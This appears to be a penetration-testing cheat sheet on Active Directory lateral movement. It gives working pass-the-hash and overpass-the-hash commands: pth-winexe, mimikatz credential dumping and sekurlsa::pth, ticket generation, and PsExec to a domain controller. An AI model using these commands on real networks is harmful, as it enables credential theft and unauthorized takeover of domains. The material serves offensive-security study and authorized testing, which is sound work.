# Lateral Movement

>Since we have located high-valuable targets logged on some workstations/servers and we have obtained password hashes and tickets from current machine, we can move laterally to try compromise these high value targets that could lead to full AD compromise.

## Pass the Hash

> Allows us to authenticate to a remote system or service using the NTLM hash of a user (will not work for Kerberos authentication).

 ```bash
#From our kali machine:
pth-winexe -U $USER%$NTLMHASH //$IPADDRESS cmd
#Change $IPADDRESS to the remote machine.
 ```

**Note:** This method only works for AD domain accounts and the built-in local administrator account.

## Overpass the Hash

Thanks to this method we can abuse the NTLM hash of a user to gain a full kerberos TGT or TGS which grants us access to another machine or service as that user.

Imagine we have compromised a workstation and there are cached NTLM hashes of other users. The first step is to grab the NTLM hash of a user using mimikatz:

```bash
sekurlsa::logonpasswords
```

Now we have to use the following mimikatz tool open a powershell prompt as the context of this user:

```bash
sekurlsa::pth /user:$USERNAME /domain:$DOMAINNAME /ntlm:$NTLMHASH /run:PowerShell.exe
```

Next, if there are no Kerberos tickets cached, we have to generate one:

```bash
#List current tickets:
klist

#Generate a TGT by authenticating somewhere:
net use \\$DCHOSTNAME
```

Now we have a full Kerberos TGT which allows us to use any tools that rely on Kerberos authentication:. For example, login as this user on the domain controller:

```bash
.\PsExec \\$DCHOSTNAME cmd.exe
```
